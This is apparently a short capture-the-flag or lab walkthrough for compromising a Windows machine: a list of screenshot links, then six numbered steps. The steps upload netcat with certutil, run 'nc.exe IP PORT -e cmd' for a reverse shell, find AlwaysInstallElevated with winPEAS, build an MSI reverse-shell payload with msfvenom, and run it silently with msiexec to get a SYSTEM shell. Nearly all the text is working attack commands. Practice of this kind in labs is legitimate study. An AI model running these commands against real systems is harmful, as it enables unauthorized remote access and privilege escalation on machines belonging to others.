![image](https://github.com/user-attachments/assets/8b4f86b1-3dfa-4cfa-97b6-ba52c58bef81)
![image](https://github.com/user-attachments/assets/286a1850-1e75-4e0a-99ca-d021ed51e553)
![image](https://github.com/user-attachments/assets/c63d709d-90ec-4937-b874-ab587896a60c)
![image](https://github.com/user-attachments/assets/46c44e87-e8cd-4c16-a4ec-3165679990c7)
![image](https://github.com/user-attachments/assets/41fc7f6f-95a7-43ca-9190-b7abdeee9ba8)
![image](https://github.com/user-attachments/assets/2bb010d7-0f3a-4029-b12c-e364fb51d086)
![image](https://github.com/user-attachments/assets/e30a4da5-e389-4b3c-baa3-8075c28e2042)
![image](https://github.com/user-attachments/assets/9ff92a97-94ce-4769-90c1-816fa60fa2e2)
![image](https://github.com/user-attachments/assets/64733c63-df08-4390-8681-47293306e423)
![image](https://github.com/user-attachments/assets/ad493d95-80e2-4337-89b8-b2fe47740e8d)

![image](https://github.com/user-attachments/assets/f6757442-6d12-4991-a8cc-82e2782254e5)

1. port 61777 open

2. certutil upload nc.exe, C:/Users/Public vs C:\Users\Public (not work)

3. C:/Users/Public/nc.exe IP PORT -e cmd --> get reverse shell, low privilege user

4. winPEAS, AlwaysInstallElevated set to 1

5. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=Port -f msi -o shell.msi

   (msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=Port -a x64 --platform Windows -f msi -o evil.msi)

6. Run MSI payload: .\shell.msi  OR msiexec /quiet /qn /i shell.msi   --> get reverse shell, SYSTEM
